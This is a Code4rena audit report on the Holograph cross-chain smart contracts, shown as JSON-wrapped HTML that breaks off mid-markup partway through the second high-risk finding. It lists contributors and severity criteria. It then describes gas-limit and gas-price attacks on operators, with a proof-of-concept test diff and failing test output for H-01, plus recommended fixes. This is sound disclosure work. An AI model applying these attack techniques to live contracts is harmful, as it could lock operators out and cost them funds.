{
  "circa": {
    "title": "Holograph contest",
    "sponsor": "Holograph",
    "slug": "2022-10-holograph",
    "date": "2022-12-15",
    "findings": "https://github.com/code-423n4/2022-10-holograph-findings/issues",
    "contest": 170
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Holograph smart contract system written in Solidity. The audit contest took place between October 18—October 25 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>147 Wardens contributed reports to the Holograph contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li>0xA5DF</li>\n<li>Lambda</li>\n<li>0x52</li>\n<li>ladboy233</li>\n<li>rbserver</li>\n<li><a href=\"https://twitter.com/securerodd\">securerodd</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li><a href=\"https://chom.dev\">Chom</a></li>\n<li>eighty</li>\n<li>Rolezn</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li>d3e4</li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>RaymondFam</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li>rotcivegaf</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li>lukris02</li>\n<li><a href=\"https://twitter.com/thePicodes\">Picodes</a></li>\n<li>cryptphi</li>\n<li>__141345__</li>\n<li>Bnke0x0</li>\n<li>RedOneN</li>\n<li>ajtra</li>\n<li>Diana</li>\n<li><a href=\"https://t.me/Road220\">m_Rassska</a></li>\n<li>m9800</li>\n<li>halden</li>\n<li>karanctf</li>\n<li>peanuts</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>ctf_sec</li>\n<li>imare</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>B2</li>\n<li>ch0bu</li>\n<li>cryptostellar5</li>\n<li>delfin454000</li>\n<li>erictee</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>KoKo</li>\n<li>leosathya</li>\n<li>mcwildy</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://medium.com/@saneryee-studio\">saneryee</a></li>\n<li><a href=\"https://twitter.com/svs_kaushik\">svskaushik</a></li>\n<li>Waze</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>cccz</li>\n<li>cdahlheimer</li>\n<li>brgltd</li>\n<li>0xZaharina</li>\n<li>aysha</li>\n<li>bobirichman</li>\n<li><a href=\"https://twitter.com/catchup22\">catchup</a></li>\n<li>djxploit</li>\n<li>mics</li>\n<li><a href=\"https://github.com/nicobevilacqua\">nicobevi</a></li>\n<li>sakshamguruji</li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li>Josiah</li>\n<li>pedr02b2</li>\n<li>rvierdiiev</li>\n<li>Dinesh11G</li>\n<li>vv7</li>\n<li>0x1f8b</li>\n<li>0xsam</li>\n<li><a href=\"https://github.com/lyciumlee\">durianSausage</a></li>\n<li>exolorkistis</li>\n<li>gianganhnguyen</li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>hxzy</li>\n<li>i_got_hacked</li>\n<li>iepathos</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li><a href=\"https://twitter.com/JagadeshRonanki\">JrNet</a></li>\n<li>Jujic</li>\n<li>Mathieu</li>\n<li>Metatron</li>\n<li>Mukund</li>\n<li>peiw</li>\n<li>Pheonix</li>\n<li><a href=\"https://twitter.com/ret2basic\">ret2basic</a></li>\n<li>ryshaw</li>\n<li>Saintcode_</li>\n<li>sakman</li>\n<li><a href=\"https://twitter/@Satyam33sharma\">Satyam_Sharma</a></li>\n<li>Shinchan (<a href=\"https://twitter.com/Sm4rty_\">Sm4rty</a>, <a href=\"https://twitter.com/prasantgupta52\">prasantgupta52</a>, and <a href=\"https://twitter.com/rohan16___\">Rohan16</a>)</li>\n<li><a href=\"https://twitter.com/meidhiwirara\">Tomio</a></li>\n<li><a href=\"https://zishansami102.github.io/\">zishansami</a></li>\n<li>minhtrng</li>\n<li>arcoun</li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li><a href=\"https://twitter.com/teawaterwire\">teawaterwire</a></li>\n<li>2997ms</li>\n<li>ballx</li>\n<li>chaduke</li>\n<li>pashov</li>\n<li>Yiko</li>\n<li>0x040</li>\n<li>0x5rings</li>\n<li>0xzh</li>\n<li>Amithuddar</li>\n<li>beardofginger</li>\n<li>bulej93</li>\n<li>catwhiskeys</li>\n<li>chrisdior4</li>\n<li><a href=\"https://twitter.com/cylzxje\">cylzxje</a></li>\n<li><a href=\"https://twitter.com/im_Dharma09\">dharma09</a></li>\n<li>emrekocak</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>KingNFT</li>\n<li>lucacez</li>\n<li>lyncurion</li>\n<li>Olivierdem</li>\n<li>PaludoX0</li>\n<li>sikorico</li>\n<li>skyle</li>\n<li>Tagir2003</li>\n<li>tnevler</li>\n<li>w0Lfrum</li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li>RaoulSchaffranek</li>\n<li><a href=\"https://twitter.com/seynixyz\">seyni</a></li>\n<li>0xhunter</li>\n<li><a href=\"https://twitter.com/a12jmx\">a12jmx</a></li>\n<li>caventa</li>\n<li>cloudjunky</li>\n<li>Diraco</li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li>francoHacker</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li><a href=\"https://twitter.com/0xheynacho\">ignacio</a></li>\n<li>kv</li>\n<li>louhk</li>\n<li>malinariy</li>\n<li>Margaret</li>\n<li><a href=\"https://twitter.com/angel_tripi\">Migue</a></li>\n<li><a href=\"https://twitter.com/bluenights004\">Ocean_Sky</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/gzeon\">gzeon</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 27 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 19 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 113 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 99 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-10-holograph\">C4 Holograph contest repository</a>, and is composed of 10 smart contracts written in the Solidity programming language and includes 2,614 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-8\" style=\"position:relative;\"><a href=\"#high-risk-findings-8\" aria-label=\"high risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (8)</h1>\n<h2 id=\"h-01-an-attacker-can-lock-operator-out-of-the-pod-by-setting-gas-limit-thats-higher-than-the-block-gas-limit-of-dest-chain\" style=\"position:relative;\"><a href=\"#h-01-an-attacker-can-lock-operator-out-of-the-pod-by-setting-gas-limit-thats-higher-than-the-block-gas-limit-of-dest-chain\" aria-label=\"h 01 an attacker can lock operator out of the pod by setting gas limit thats higher than the block gas limit of dest chain permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/414\">[H-01] An attacker can lock operator out of the pod by setting gas limit that’s higher than the block gas limit of dest chain</a></h2>\n<p><em>Submitted by 0xA5DF, also found by 0x52</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415\">HolographOperator.sol#L415</a><br></p>\n<p>When a beaming job is executed, there’s a requirement that the gas left would be at least as the <code>gasLimit</code> set by the user.\nGiven that there’s no limit on the <code>gasLimit</code> the user can set, a user can set the <code>gasLimit</code> to amount that’s higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.</p>\n<p>The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. <code>gasPrice</code> * <code>gasLimit</code> in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that’s 20M gas limit and <code>200 Gwei gas = 4 Matic</code>, for Avalanche the block gas limit seems to be 8M and the price <code>~30 nAVAX = 0.24 AVAX</code>). Plus, the operator isn’t going to receive that amount.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test demonstrates this scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 1f2b959..a1a23b7 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/06_cross-chain_minting_tests_l1_l2.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/06_cross-chain_minting_tests_l1_l2.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -276,6 +276,7 @@ describe(&#39;Testing cross-chain minting (L1 &amp; L2)&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             gasLimit: TESTGASLIMIT,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        estimatedGas = BigNumber.from(50_000_000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // process.stdout.write(&#39;\\n&#39; + &#39;gas estimation: &#39; + estimatedGas.toNumber() + &#39;\\n&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -303,7 +304,8 @@ describe(&#39;Testing cross-chain minting (L1 &amp; L2)&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             &#39;0x&#39; + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             payload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        estimatedGas = BigNumber.from(5_000_000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         process.stdout.write(&#39; &#39;.repeat(10) + &#39;expected lz gas to be &#39; + executeJobGas(payload, true).toString());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, &#39;lzReceive&#39;, [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -313,7 +315,7 @@ describe(&#39;Testing cross-chain minting (L1 &amp; L2)&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             payload,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">               gasPrice: GASPRICE,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-              gasLimit: executeJobGas(payload),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+              gasLimit: 5_000_000,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             },</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           ])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         )</span></span></span></code></pre>\n<p>The test would fail with the following output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  1) Testing cross-chain minting (L1 &amp; L2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       Deploy cross-chain contracts via bridge deploy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         hToken</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">           deploy l1 equivalent on l2:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Limit the <code>gasLimit</code> to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it’s checked).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/414#issuecomment-1308900212\">ACC01ADE (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Good idea to generally limit the maximum gas allowed in an operator job.</p>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/84\">Feature/HOLO-604: implementing critical issue fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-if-user-sets-a-low-gasprice-the-operator-would-have-to-choose-between-being-locked-out-of-the-pod-or-executing-the-job-anyway\" style=\"position:relative;\"><a href=\"#h-02-if-user-sets-a-low-gasprice-the-operator-would-have-to-choose-between-being-locked-out-of-the-pod-or-executing-the-job-anyway\" aria-label=\"h 02 if user sets a low gasprice the operator would have to choose between being locked out of the pod or executing the job anyway permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/364\">[H-02] If user sets a low <code>gasPrice</code> the operator would have to choose between being locked out of the pod or executing the job anyway</a></h2>\n<p><em>Submitted by 0xA5DF, also found by cryptphi, Jeiwan, and Picodes</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340\">HolographOperator.sol#L202-L340</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596\">HolographOperator.sol#L593-L596</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294\">LayerZeroModule.sol#L277-L294</a><br></p>\n<p>During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via <code>hToken</code>.<br>\nThe amount he has to pay is determined according to the <code>gasPrice</code> set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens).<br>\nHowever, in case the user sets a low price (as low as 1 wei) the operator can’t skip the job because he’s locked out of the pod till he executes the job.<br>\nThe operator would have to choose between loosing money by paying a higher gas fee than he’s compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.<br></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Operator would be losing money by having to pay gas fee that’s higher than the compensation (gas fee can be a few dozens of USD for heavy txs).<br>\nThis could also be used by attackers to make operators pay for the attackers’ expensive gas tasks:</p>\n<ul>\n<li>They can deploy their own contract as the ‘source contract’</li>\n<li>Use the <code>bridgeIn</code> event and the <code>data</code> that’s being sent to it to instruct the source contract what operations need to be executed</li>\n<li>They can use it for execute operations where the <code>tx.origin</code> doesn’t matter (e.g. USDc gasless send)</li>\n</ul>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 